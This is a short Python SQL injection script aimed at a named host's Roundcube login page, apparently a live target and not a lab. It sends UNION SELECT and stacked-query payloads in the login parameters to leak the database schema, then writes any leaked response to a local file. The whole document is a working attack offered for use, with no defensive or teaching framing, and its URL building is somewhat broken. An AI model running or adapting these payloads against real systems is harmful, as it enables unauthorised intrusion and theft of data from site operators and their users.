#!/usr/bin/env python3
import requests
import sys

TARGET = "http://waal968.icu/?_task=login"

# This payload forces the database to return an error that includes the table structure
# If Roundcube passes this through, you will see the DB schema in the response body or console.
payloads = [
    "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
    "'; SHOW TABLES; --"
]

print("[*] Attempting to force database schema leak...")

for p in payloads:
    url = f"{TARGET}?user={p}&pass=admin"
    
    try:
        r = requests.get(url, timeout=15)
        
        # Check if the response contains keywords related to DB structure
        text_lower = r.text.lower()
        
        if "users table" in text_lower or "column name" in text_lower or "show tables" in text_lower:
            print(f"[+] SUCCESS! Payload '{p[:40]}...' leaked database info.")
            
            # Save the full response to analyze for schema details
            with open("db_schema_leak.txt", "w") as f:
                f.write(f"Payload: {p}\nResponse:\n{r.text}")
                
        else:
            print(f"[!] Payload '{p[:40]}...' returned Status {r.status_code} but no obvious schema leak.")
            
    except Exception as e:
        print(f"[!] Error testing payload: {e}")

print("[*] Check 'db_schema_leak.txt' for the database structure.")

